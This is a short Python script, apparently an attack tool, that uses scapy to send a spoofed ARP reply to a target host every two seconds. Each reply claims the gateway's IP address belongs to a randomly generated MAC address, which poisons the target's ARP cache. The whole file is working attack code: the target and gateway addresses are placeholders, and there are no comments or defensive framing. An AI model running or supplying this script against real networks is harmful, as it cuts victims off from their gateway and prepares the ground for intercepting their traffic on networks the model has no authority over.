from scapy.all import  send
from random import randint
from time import sleep

from scapy.layers.l2 import ARP

GATEWAY_IP = "xxxxxxxxxxxxxxx"
TARGET_IP = "yyyyyyyyyyyyy"
INTERFACE = "enp0s3"

def generate_mac():
    return ":".join(f"{randint(0, 255):02x}" for _ in range(6))

def send_spoofed_arp(target_ip, gateway_ip, iface):
    mac = generate_mac()
    arp = ARP(
        op=2,
        pdst=target_ip,
        psrc=gateway_ip,
        hwsrc=mac
    )
    send(arp, iface=iface, verbose=0)
    print(f"[+] Sent spoofed ARP: {gateway_ip} is-at {mac}")

if __name__ == "__main__":
    while True:
        send_spoofed_arp(TARGET_IP, GATEWAY_IP, INTERFACE)
        sleep(2)
